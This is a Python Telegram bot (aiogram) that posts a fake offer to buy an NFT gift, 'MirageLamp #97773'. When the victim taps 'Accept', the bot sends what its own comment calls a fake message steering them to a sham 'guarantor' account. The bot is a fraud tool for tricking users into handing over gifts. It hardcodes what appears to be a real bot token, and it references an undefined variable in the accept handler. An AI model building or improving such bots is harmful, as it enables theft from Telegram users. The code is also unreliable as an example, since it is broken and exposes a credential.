import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import InlineQueryResultArticle, InputTextMessageContent, InlineKeyboardMarkup, InlineKeyboardButton

BOT_TOKEN = "8427894905:AAGzwZ9d-eot8oQujYfSbvlFqG4pYBQn4nI"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

@dp.inline_query()
async def inline_offer(query: types.InlineQuery):
    # Замени на свою ссылку NFT и ник гаранта
    nft_link = "https://t.me/nft/MirageLamp-97773"
    guarantor = "@GiftLinkRelayer"
    
    text = (
        f"✈️ **{query.from_user.first_name}** предлагает Вам\n\n"
        f"50 💎 **gram** за подарок **MirageLamp #97773**.\n\n"
        f"Предложение действует ещё 6ч 00м.\n\n"
        f"{nft_link}"
    )
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="Отклонить", callback_data="decline"),
            InlineKeyboardButton(text="Принять", callback_data="accept")
        ]
    ])
    
    result = InlineQueryResultArticle(
        id="offer_1",
        title="Создать оффер",
        description="Нажми, чтобы отправить предложение",
        input_message_content=InputTextMessageContent(
            message_text=text,
            parse_mode="Markdown",
            disable_web_page_preview=False
        ),
        reply_markup=kb
    )
    
    await query.answer([result], cache_time=1)

@dp.callback_query(F.data == "accept")
async def accept_offer(callback: types.CallbackQuery):
    # Отправляем фейковое сообщение о переходе к гаранту
    await callback.message.answer(
        f"Передача выполняется через аккаунт сделки {guarantor}.\n"
        "Подтвердите получение в системе.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="Перейти к гаранту", url="https://t.me/GiftLinkRelayer")]
        ])
    )
    await callback.answer()

@dp.callback_query(F.data == "decline")
async def decline_offer(callback: types.CallbackQuery):
    await callback.message.edit_text("Вы отклонили предложение.")
    await callback.answer()

async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())